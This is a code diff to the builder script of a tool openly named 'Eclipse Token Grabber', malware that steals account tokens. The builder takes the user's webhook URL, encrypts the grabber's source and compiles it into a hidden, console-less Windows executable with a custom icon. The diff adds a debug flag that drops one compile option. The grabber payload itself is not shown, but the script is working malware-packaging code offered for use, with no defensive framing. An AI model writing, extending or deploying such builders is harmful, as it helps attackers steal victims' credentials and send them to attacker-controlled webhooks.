@@ -20,7 +20,7 @@ ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 KEY = Fernet.generate_key().decode()
 
 
-def build(webhook: str, out_file: str):
+def build(webhook: str, out_file: str, debug: bool):
     code_file = open(ECLIPSE_GRABBER_PATH, 'r')
     code = code_file.read()
     code_file.close()
@@ -49,6 +49,9 @@ def build(webhook: str, out_file: str):
 
     compile_command += [out_file + ".py", "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img','exe_file.ico')}"]
 
+    if debug:
+        compile_command.pop(3)
+        
     try:
         command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
         result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
@@ -68,6 +71,7 @@ def get_args() -> Namespace:
     parser = ArgumentParser(description='Eclipse Token Grabber Builder')
     parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
     parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
+    parser.add_argument('-d', '--debug', help='enable debug mode', default='', required=False, action='store_true')
     return parser.parse_args()
 
 
@@ -75,7 +79,7 @@ def main(args: Namespace):
     print(TITLE)
     print("[+] Encryption Key:", KEY)
     print("\n[+] Building Eclipse Token Grabber, please wait...")
-    build(args.webhook, args.outfile)
+    build(args.webhook, args.outfile, args.debug)
     print("\n[+] Successfully Built!",
           "\n\n[+] You can find it inside the dist directory")
 
